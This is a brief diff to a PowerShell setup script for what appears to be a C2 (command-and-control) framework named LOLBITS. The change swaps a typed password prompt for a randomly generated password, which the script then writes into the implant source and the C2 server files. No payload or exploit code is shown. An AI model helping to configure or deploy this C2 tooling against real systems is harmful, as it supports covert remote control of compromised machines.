@@ -124,7 +124,7 @@ $scrProcessor = $fullPath.fullPath + "|" + $arguments.arguments
 (Get-Content "C&C\web.config").replace('<ident1>',$scrProcessor) | Set-Content "C&C\web.config"
 (Get-Content "C&C\web.config").replace('<ident2>',$path) | Set-Content "C&C\web.config"
 
-$pass = Read-Host -Prompt "[*] Insert the password that will be used to encrypt the communications"
+$pass = Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 15 | % {[char]$_}) )
 (Get-Content "LOLBITS\LOLBITS\Program.cs").replace('<ident3>',$pass) | Set-Content "LOLBITS\LOLBITS\Program.cs"
 (Get-Content "C&C\myapp.py").replace('<ident4>',$pass) | Set-Content "C&C\myapp.py"
 (Get-Content "C&C\lolbins\lawlbin.py").replace('<ident5>',$pass) | Set-Content "C&C\lolbins\lawlbin.py"
